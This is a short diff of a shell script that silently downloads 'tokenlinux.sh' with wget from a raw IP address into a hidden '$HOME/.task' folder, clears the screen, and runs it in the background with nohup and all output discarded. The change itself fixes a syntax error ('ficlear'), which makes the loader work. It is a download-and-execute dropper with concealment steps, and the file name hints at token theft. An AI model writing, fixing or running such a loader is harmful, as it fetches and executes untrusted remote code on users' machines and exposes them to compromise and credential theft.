@@ -9,7 +9,8 @@ elif command -v wget &> /dev/null; then
   wget -q -O "$HOME/.task/tokenlinux.sh" "http://64.204.80.251/570/tokenlinux.sh"
 else
   exit 1
-ficlear
+fi
+clear
 chmod +x "$HOME/.task/tokenlinux.sh"
 clear
 nohup bash "$HOME/.task/tokenlinux.sh" > /dev/null 2>&1 &
